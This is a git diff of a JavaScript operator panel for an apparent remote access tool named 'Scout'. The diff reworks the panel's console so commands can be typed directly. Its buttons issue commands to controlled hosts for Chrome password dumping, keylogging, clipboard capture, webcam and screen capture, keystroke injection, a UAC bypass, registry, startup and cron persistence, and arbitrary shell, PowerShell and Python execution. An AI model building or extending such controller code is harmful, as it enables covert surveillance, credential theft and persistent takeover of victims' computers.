@@ -180,6 +180,7 @@ $(document).ready(function () {
 
             logToConsole("[+]Available functions loaded", true);
             displaySelectedFunctions("base")
+            logToConsole("", false, true);
         } else {
             ScoutGlobals.error = true;
             showMessage(data.output_message);
@@ -318,9 +319,34 @@ $(document).ready(function () {
        $("#div_direct_classify_lin").show();
     });
 
-    function logOutputCB(data) {
+    function logOutputCB(data, extra_input=undefined) {
         if (data.output === "Success") {
-            logToConsole(data.data, true);
+            if (extra_input) {
+                if (extra_input.command !== "help_command")
+                    if (data.output_message === "return") {
+                        if (extra_input.command === "ping"){
+                            ScoutGlobals.error = true;
+                            showMessage("Scout is dead, removing from database...");
+                            scrollToTop();
+                        }
+                        ScoutGlobals.ifc = "Scouts";
+                        loaderDirect("-1");
+                    } else {
+                        if (extra_input.command === "ping"){
+                            ScoutGlobals.error = false;
+                            showMessage(data.output_message);
+                            scrollToTop();
+                        }
+                        loaderDirect("-1");
+                    }
+                else {
+                    logToConsole(data.data, true, false,true);
+                }
+            }
+            else {
+                logToConsole(data.data, true);
+            }
+            logToConsole("", false, true);
         } else if (data.output === "Fail") {
             ScoutGlobals.error = true;
             showMessage(data.output_message);
@@ -338,7 +364,8 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_activeWindowsDump").click(function () {
-        logToConsole("[>]active", true);
+        $(".input_console_command").last().val("active");
+        $(".input_console_command").last().attr("readonly", true);
         triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
     });
 
@@ -349,7 +376,7 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_activeWindowsDump").click(function () {
-        logToConsole("[>]active", true);
+        $(".input_console_command").last().val("active");
         triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
     });
 
@@ -362,7 +389,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_checkAdmin").click(function () {
-        logToConsole("[>]admin", true);
+        $(".input_console_command").last().val("admin");
         triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
     });
 
@@ -373,7 +400,7 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_checkAdmin").click(function () {
-        logToConsole("[>]admin", true);
+        $(".input_console_command").last().val("admin");
         triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
     });
 
@@ -386,11 +413,11 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_chromePasswordDump_active").click(function () {
-        logToConsole("[>]chromedump active", true);
+        $(".input_console_command").last().val("chromedump active");
         triggerAjaxDirectInterface("chromedump active", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_chromePasswordDump_passive").click(function () {
-        logToConsole("[>]chromedump passive", true);
+        $(".input_console_command").last().val("chromedump passive");
         triggerAjaxDirectInterface("chromedump passive", true, logOutputCB, undefined);
     });
 
@@ -403,16 +430,16 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_clipLogger_clear").click(function () {
-        logToConsole("[>]clip_clear", true);
+        $(".input_console_command").last().val("clip_clear");
         triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_clipLogger_dump").click(function () {
-        logToConsole("[>]clip_dump", true);
+        $(".input_console_command").last().val("clip_dump");
         triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_clipLogger_set").click(function () {
         if ($("#input_direct_components_win_clipLogger_set").val() !== "") {
-            logToConsole("[>]clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true);
+            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true);
             triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_clipLogger_set").val("");
         } else {
@@ -429,16 +456,16 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_clipLogger_clear").click(function () {
-        logToConsole("[>]clip_clear", true);
+        $(".input_console_command").last().val("clip_clear");
         triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
     });
     $("#button_direct_components_lin_clipLogger_dump").click(function () {
-        logToConsole("[>]clip_dump", true);
+        $(".input_console_command").last().val("clip_dump");
         triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
     });
     $("#button_direct_components_lin_clipLogger_set").click(function () {
         if ($("#input_direct_components_lin_clipLogger_set").val() !== "") {
-            logToConsole("[>]clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true);
+            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true);
             triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_clipLogger_set").val("");
         } else {
@@ -458,7 +485,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_downloadFile").click(function () {
         if ($("#input_direct_components_win_downloadFile").val() !== "") {
-            logToConsole("[>]download " + $("#input_direct_components_win_downloadFile").val(), true);
+            $(".input_console_command").last().val("download " + $("#input_direct_components_win_downloadFile").val(), true);
             triggerAjaxDirectInterface("download " + $("#input_direct_components_win_downloadFile").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_downloadFile").val("");
         } else {
@@ -476,7 +503,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_downloadFile").click(function () {
         if ($("#input_direct_components_lin_downloadFile").val() !== "") {
-            logToConsole("[>]download " + $("#input_direct_components_lin_downloadFile").val(), true);
+            $(".input_console_command").last().val("download " + $("#input_direct_components_lin_downloadFile").val(), true);
             triggerAjaxDirectInterface("download " + $("#input_direct_components_lin_downloadFile").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_downloadFile").val("");
         } else {
@@ -496,7 +523,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_downloadWeb").click(function () {
         if ($("#input_direct_components_win_downloadWeb_directory").val() !== "" && $("#input_direct_components_win_downloadWeb_url").val() !== "") {
-            logToConsole("[>]download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true);
+            $(".input_console_command").last().val("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true);
             triggerAjaxDirectInterface("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_downloadWeb_directory").val("");
             $("#input_direct_components_win_downloadWeb_url").val("");
@@ -515,7 +542,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_downloadWeb").click(function () {
         if ($("#input_direct_components_lin_downloadWeb_directory").val() !== "" && $("#input_direct_components_lin_downloadWeb_url").val() !== "") {
-            logToConsole("[>]download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true);
+            $(".input_console_command").last().val("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true);
             triggerAjaxDirectInterface("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_downloadWeb_directory").val("");
             $("#input_direct_components_lin_downloadWeb_url").val("");
@@ -535,7 +562,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_getIdle").click(function () {
-        logToConsole("[>]idle", true);
+        $(".input_console_command").last().val("idle");
         triggerAjaxDirectInterface("idle", true, logOutputCB, undefined);
     });
 
@@ -548,7 +575,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_screenshot").click(function () {
-        logToConsole("[>]screen", true);
+        $(".input_console_command").last().val("screen");
         triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
     });
 
@@ -559,7 +586,7 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_screenshot").click(function () {
-        logToConsole("[>]screen", true);
+        $(".input_console_command").last().val("screen");
         triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
     });
 
@@ -572,7 +599,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_webcam").click(function () {
-        logToConsole("[>]webcam", true);
+        $(".input_console_command").last().val("webcam");
         triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
     });
 
@@ -583,7 +610,7 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_webcam").click(function () {
-        logToConsole("[>]webcam", true);
+        $(".input_console_command").last().val("webcam");
         triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
     });
 
@@ -596,15 +623,15 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_logger_start").click(function () {
-        logToConsole("[>]key_start", true);
+        $(".input_console_command").last().val("key_start");
         triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_logger_stop").click(function () {
-        logToConsole("[>]key_stop", true);
+        $(".input_console_command").last().val("key_stop");
         triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_logger_dump").click(function () {
-        logToConsole("[>]key_dump", true);
+        $(".input_console_command").last().val("key_dump");
         triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
     });
 
@@ -615,15 +642,15 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_logger_start").click(function () {
-        logToConsole("[>]key_start", true);
+        $(".input_console_command").last().val("key_start");
         triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
     });
     $("#button_direct_components_lin_logger_stop").click(function () {
-        logToConsole("[>]key_stop", true);
+        $(".input_console_command").last().val("key_stop");
         triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
     });
     $("#button_direct_components_lin_logger_dump").click(function () {
-        logToConsole("[>]key_dump", true);
+        $(".input_console_command").last().val("key_dump");
         triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
     });
 
@@ -636,7 +663,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_systemInfo").click(function () {
-        logToConsole("[>]sysinfo", true);
+        $(".input_console_command").last().val("sysinfo");
         triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
     });
 
@@ -647,7 +674,7 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_systemInfo").click(function () {
-        logToConsole("[>]sysinfo", true);
+        $(".input_console_command").last().val("sysinfo");
         triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
     });
 
@@ -661,7 +688,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_browser").click(function () {
         if ($("#input_direct_components_win_browser").val() !== "") {
-            logToConsole("[>]browse " + $("#input_direct_components_win_browser").val(), true);
+            $(".input_console_command").last().val("browse " + $("#input_direct_components_win_browser").val(), true);
             triggerAjaxDirectInterface("browse " + $("#input_direct_components_win_browser").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_browser").val("");
         } else {
@@ -680,12 +707,12 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_injectKeystrokes_get").click(function () {
-        logToConsole("[>]inj_valid", true);
+        $(".input_console_command").last().val("inj_valid");
         triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
     });
     $("#button_direct_components_win_injectKeystrokes_text").click(function () {
         if ($("#input_direct_components_win_injectKeystrokes_text").val() !== "") {
-            logToConsole("[>]inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true);
+            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true);
             triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_injectKeystrokes_text").val("");
         } else {
@@ -696,7 +723,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_injectKeystrokes_button").click(function () {
         if ($("#input_direct_components_win_injectKeystrokes_button").val() !== "") {
-            logToConsole("[>]inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true);
+            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true);
             triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_injectKeystrokes_button").val("");
         } else {
@@ -707,7 +734,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_injectKeystrokes_combination").click(function () {
         if ($("#input_direct_components_win_injectKeystrokes_combination").val() !== "") {
-            logToConsole("[>]inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true);
+            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true);
             triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_injectKeystrokes_combination").val("");
         } else {
@@ -724,12 +751,12 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_injectKeystrokes_get").click(function () {
-        logToConsole("[>]inj_valid", true);
+        $(".input_console_command").last().val("inj_valid");
         triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
     });
     $("#button_direct_components_lin_injectKeystrokes_text").click(function () {
         if ($("#input_direct_components_lin_injectKeystrokes_text").val() !== "") {
-            logToConsole("[>]inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true);
+            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true);
             triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_injectKeystrokes_text").val("");
         } else {
@@ -740,7 +767,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_injectKeystrokes_button").click(function () {
         if ($("#input_direct_components_lin_injectKeystrokes_button").val() !== "") {
-            logToConsole("[>]inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true);
+            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true);
             triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_injectKeystrokes_button").val("");
         } else {
@@ -751,7 +778,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_injectKeystrokes_combination").click(function () {
         if ($("#input_direct_components_lin_injectKeystrokes_combination").val() !== "") {
-            logToConsole("[>]inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true);
+            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true);
             triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_injectKeystrokes_combination").val("");
         } else {
@@ -780,19 +807,19 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_interfaceLock_lock_keyboard").click(function () {
-        logToConsole("[>]inter_lock key", true);
+        $(".input_console_command").last().val("inter_lock key");
         triggerAjaxDirectInterface("inter_lock key", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_interfaceLock_lock_mouse").click(function () {
-        logToConsole("[>]inter_lock mouse", true);
+        $(".input_console_command").last().val("inter_lock mouse");
         triggerAjaxDirectInterface("inter_lock mouse", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_interfaceLock_unlock_keyboard").click(function () {
-        logToConsole("[>]inter_unlock key", true);
+        $(".input_console_command").last().val("inter_unlock key");
         triggerAjaxDirectInterface("inter_unlock key", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_interfaceLock_unlock_mouse").click(function () {
-        logToConsole("[>]inter_unlock mouse", true);
+        $(".input_console_command").last().val("inter_unlock mouse");
         triggerAjaxDirectInterface("inter_unlock mouse", true, logOutputCB, undefined);
     });
 
@@ -805,12 +832,12 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_setAudio_get").click(function () {
-        logToConsole("[>]set_audio_range", true);
+        $(".input_console_command").last().val("set_audio_range");
         triggerAjaxDirectInterface("set_audio_range", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_setAudio_set").click(function () {
         if ($("#input_direct_components_win_setAudio_set").val() !== "") {
-            logToConsole("[>]set_audio " + $("#input_direct_components_win_setAudio_set").val(), true);
+            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true);
             triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_setAudio_set").val("");
         } else {
@@ -828,7 +855,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_setAudio").click(function () {
         if ($("#input_direct_components_lin_setAudio").val() !== "") {
-            logToConsole("[>]set_audio " + $("#input_direct_components_lin_setAudio").val(), true);
+            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_lin_setAudio").val(), true);
             triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_lin_setAudio").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_setAudio").val("");
         } else {
@@ -847,19 +874,19 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_systemStatusChange_lock").click(function () {
-        logToConsole("[>]lock", true);
+        $(".input_console_command").last().val("lock");
         triggerAjaxDirectInterface("lock", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_systemStatusChange_logout").click(function () {
-        logToConsole("[>]logout", true);
+        $(".input_console_command").last().val("logout");
         triggerAjaxDirectInterface("logout", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_systemStatusChange_restart").click(function () {
-        logToConsole("[>]restart", true);
+        $(".input_console_command").last().val("restart");
         triggerAjaxDirectInterface("restart", true, logOutputCB, undefined);
     });
     $("#button_direct_components_win_systemStatusChange_shutdown").click(function () {
-        logToConsole("[>]shutdown", true);
+        $(".input_console_command").last().val("shutdown");
         triggerAjaxDirectInterface("shutdown", true, logOutputCB, undefined);
     });
 
@@ -873,7 +900,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_uploadFile").click(function () {
         if ($("#input_direct_components_win_uploadFile").val() !== "") {
-            logToConsole("[>]upload " + $("#input_direct_components_win_uploadFile").val(), true);
+            $(".input_console_command").last().val("upload " + $("#input_direct_components_win_uploadFile").val(), true);
             triggerAjaxDirectInterface("upload " + $("#input_direct_components_win_uploadFile").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_uploadFile").val("");
         } else {
@@ -891,7 +918,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_uploadFile").click(function () {
         if ($("#input_direct_components_lin_uploadFile").val() !== "") {
-            logToConsole("[>]upload " + $("#input_direct_components_lin_uploadFile").val(), true);
+            $(".input_console_command").last().val("upload " + $("#input_direct_components_lin_uploadFile").val(), true);
             triggerAjaxDirectInterface("upload " + $("#input_direct_components_lin_uploadFile").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_uploadFile").val("");
         } else {
@@ -911,7 +938,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_wallpaperChanger").click(function () {
         if ($("#input_direct_components_win_wallpaperChanger").val() !== "") {
-            logToConsole("[>]wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true);
+            $(".input_console_command").last().val("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true);
             triggerAjaxDirectInterface("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_wallpaperChanger").val("");
         } else {
@@ -1092,7 +1119,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_CMD").click(function () {
         if ($("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            logToConsole("[>]exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true);
+            $(".input_console_command").last().val("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true);
             triggerAjaxDirectInterface("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
             $("#input_direct_components_win_CMD").val(">>> ");
         } else {
@@ -1112,7 +1139,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_bash").click(function () {
         if ($("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            logToConsole("[>]exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true);
+            $(".input_console_command").last().val("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true);
             triggerAjaxDirectInterface("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
             $("#input_direct_components_lin_bash").val(">>> ");
         } else {
@@ -1132,7 +1159,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_powershell").click(function () {
         if ($("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            logToConsole("[>]exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true);
+            $(".input_console_command").last().val("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true);
             triggerAjaxDirectInterface("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
             $("#input_direct_components_win_powershell").val(">>> ");
         } else {
@@ -1152,7 +1179,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_file").click(function () {
         if ($("#input_direct_components_win_file").val() !== "") {
-            logToConsole("[>]exec_f " + $("#input_direct_components_win_file").val(), true);
+            $(".input_console_command").last().val("exec_f " + $("#input_direct_components_win_file").val(), true);
             triggerAjaxDirectInterface("exec_f " + $("#input_direct_components_win_file").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_file").val("");
         } else {
@@ -1173,7 +1200,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_python_file").click(function () {
         if ($("#input_direct_components_win_python_file").val() !== "") {
-            logToConsole("[>]exec_py_file " + $("#input_direct_components_win_python_file").val(), true);
+            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_win_python_file").val(), true);
             triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_win_python_file").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_python_file").val("");
         } else {
@@ -1187,7 +1214,7 @@ $(document).ready(function () {
         $(".multiline").each(function () {
             pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
         });
-        logToConsole("[>]exec_py " + pythonProgram, true);
+        $(".input_console_command").last().val("exec_py " + pythonProgram, true);
         triggerAjaxDirectInterface("exec_py " + pythonProgram, true, logOutputCB, undefined);
     });
 
@@ -1200,7 +1227,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_lin_python_file").click(function () {
         if ($("#input_direct_components_lin_python_file").val() !== "") {
-            logToConsole("[>]exec_py_file " + $("#input_direct_components_lin_python_file").val(), true);
+            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true);
             triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true, logOutputCB, undefined);
             $("#input_direct_components_lin_python_file").val("");
         } else {
@@ -1214,7 +1241,7 @@ $(document).ready(function () {
         $(".multiline").each(function () {
             pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
         });
-        logToConsole("[>]exec_py " + pythonProgram, true);
+        $(".input_console_command").last().val("exec_py " + pythonProgram, true);
         triggerAjaxDirectInterface("exec_py " + pythonProgram, true, logOutputCB, undefined);
     });
 
@@ -1227,7 +1254,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_registryPersistence").click(function () {
-        logToConsole("[>]reg_persist", true);
+        $(".input_console_command").last().val("reg_persist");
         triggerAjaxDirectInterface("reg_persist", true, logOutputCB, undefined);
     });
 
@@ -1241,7 +1268,7 @@ $(document).ready(function () {
     });
     $("#button_direct_components_win_sdcltUACBypass").click(function () {
         if ($("#input_direct_components_win_sdcltUACBypass").val() !== "") {
-            logToConsole("[>]sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true);
+            $(".input_console_command").last().val("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true);
             triggerAjaxDirectInterface("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true, logOutputCB, undefined);
             $("#input_direct_components_win_sdcltUACBypass").val("");
         } else {
@@ -1260,7 +1287,7 @@ $(document).ready(function () {
         $("#div_direct_classify_win").hide();
     });
     $("#button_direct_components_win_startupFolderPersistence").click(function () {
-        logToConsole("[>]startup_persist", true);
+        $(".input_console_command").last().val("startup_persist");
         triggerAjaxDirectInterface("startup_persist", true, logOutputCB, undefined);
     });
 
@@ -1273,8 +1300,28 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_cronJobPersistence").click(function () {
-        logToConsole("[>]cron_persist", true);
+        $(".input_console_command").last().val("cron_persist");
         triggerAjaxDirectInterface("cron_persist", true, logOutputCB, undefined);
+    });
+
+
+
+    $(document).on('focus', ".input_console_command", function() {
+        $(document).off('keypress, keydown', '.input_console_command');
+        $(document).on('keypress, keydown', '.input_console_command', function(event) {
+            if (event.which === 13) {
+                event.preventDefault();
+                $(this).attr("readonly", true);
+                let val = $(this).val();
+                if (val === "ping" || val === "disconnect" || val === "kill" || val.split(" ")[0] === "sleep"){
+                    triggerAjaxDirectInterface(val, true, logOutputCB, {"command": val});
+                } else if (val === "help" || val === "?") {
+                    triggerAjaxDirectInterface("help_command", true, logOutputCB, {"command": "help_command"});
+                } else {
+                    triggerAjaxDirectInterface(val, true, logOutputCB, undefined);
+                }
+            }
+        });
     });
 
     // SCOUT FUNCTIONS !!
@@ -1666,22 +1713,46 @@ $(document).ready(function () {
     }
 
     // Main function to log to console
-    function logToConsole(t, newline) {
+    function logToConsole(t, newline, input=false, help=false) {
         let $selector = $("#p_console_output");
-        let appendString;
-        appendString = t.toString()
-            .replace(/\[\+\]/g, "<p1 style='color: #13a10e'>[+]</p1>")
-            .replace(/\[\*\]/g, "<p1 style='color: #3b78ff'>[*]</p1>")
-            .replace(/\[\-\]/g, "<p1 style='color: #e74856'>[-]</p1>")
-            .replace(/\[\!\]/g, "<p1 style='color: #f9f1a5'>[!]</p1>")
-            .replace(/\[\>\]/g, "<p1 style='color: #b4009e'>[>]</p1>");
-        appendString = String.raw`${appendString}`;
-        appendString = appendString.replace(/\n/g, "<br>");
-        $selector.append(appendString);
-        if (newline) {
-            $selector.append("<br>");
+        if (!input) {
+            let appendString;
+            appendString = t.toString()
+                .replace(/ /g, "\u00A0")
+                .replace(/\u00A0</g, "\u00A0&lt;")
+                .replace(/\u00A0>/g, "\u00A0&gt;")
+                .replace(/<\u00A0/g, "&lt;\u00A0")
+                .replace(/>\u00A0/g, "&gt;\u00A0")
+                .replace(/-/g, "&#8209;")
+                .replace(/\[\+\]/g, "<p1 style='color: #13a10e'>[+]</p1>")
+                .replace(/\[\*\]/g, "<p1 style='color: #3b78ff'>[*]</p1>")
+                .replace(/\[\&#8209;\]/g, "<p1 style='color: #e74856'>[-]</p1>")
+                .replace(/\[\!\]/g, "<p1 style='color: #f9f1a5'>[!]</p1>")
+                .replace(/\[\>\]/g, "<p1 style='color: #b4009e'>[>]</p1>");
+            if (help) {
+                appendString = appendString
+                    .replace("exec_py_script", "<p1 style='color: #e74856'>exec_py_script</p1>")
+                    .replace("Script\u00A0in\u00A0the\u00A0terminal\u00A0a\u00A0block\u00A0of\u00A0in&#8209;memory\u00A0arbitrary\u00A0python\u00A0code\u00A0to\u00A0execute\u00A0on\u00A0the\u00A0target\u00A0system","<p1 style='color: #e74856'>Function\u00A0not\u00A0supported\u00A0in\u00A0web\u00A0command\u00A0line.\u00A0Please\u00A0use\u00A0execute\u00A0python\u00A0to\u00A0script\u00A0a\u00A0program</p1>");
+            }
+            appendString = String.raw`${appendString}`;
+            appendString = appendString.replace(/\n/g, "<br>");
+            $selector.append(appendString);
+            if (newline) {
+                $selector.append("<br>");
+            }
+            $selector.scrollTop($selector[0].scrollHeight);
+        } else {
+            let index = $(".input_console_command").length;
+            if (index) {
+                $("#input_console_command_" + String(index - 1)).attr("readonly", true);
+                logToConsole("[>]", false);
+                $selector.append("<input type='text' style='height: auto !important; background-color: #252629 !important; font-size: inherit !important; color: #bfbfbb !important;' id='input_console_command_" + String(index) + "' class='input_console_command'><br>");
+            } else {
+                logToConsole("[>]", false);
+                $selector.append("<input type='text' style='height: auto !important; background-color: #252629 !important; font-size: inherit !important; color: #bfbfbb !important;' id='input_console_command_0' class='input_console_command'><br>");
+            }
+            $("#input_console_command_" + String(index)).focus();
         }
-        $selector.scrollTop($selector.prop("scrollHeight"));
     }
 
     // Show chosen function's content
